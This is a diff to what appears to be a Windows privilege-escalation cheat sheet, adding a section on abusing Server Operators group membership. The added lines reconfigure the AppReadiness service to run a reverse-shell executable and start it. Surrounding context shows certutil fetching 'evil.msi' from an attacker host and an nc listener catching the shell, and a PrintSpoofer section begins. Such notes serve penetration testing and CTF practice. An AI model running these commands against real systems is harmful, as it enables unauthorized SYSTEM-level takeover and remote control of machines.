@@ -282,7 +282,13 @@ certutil.exe -urlcache -f http://10.0.2.5:8888/evil.msi evil.msi
 sudo rlwrap nc- nlvp 443
 evil.msi
 ```
-
+##### Abusing Server Operators Group
+```
+sc qc AppReadiness 
+sc.exe config AppReadiness binPath= "C:\users\svc-printer\documents\rev.exe"
+sc start AppReadiness
+```
+![image](https://github.com/user-attachments/assets/b3dee6e9-4c6f-4324-8af8-3d95e0650cec)
 ##### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
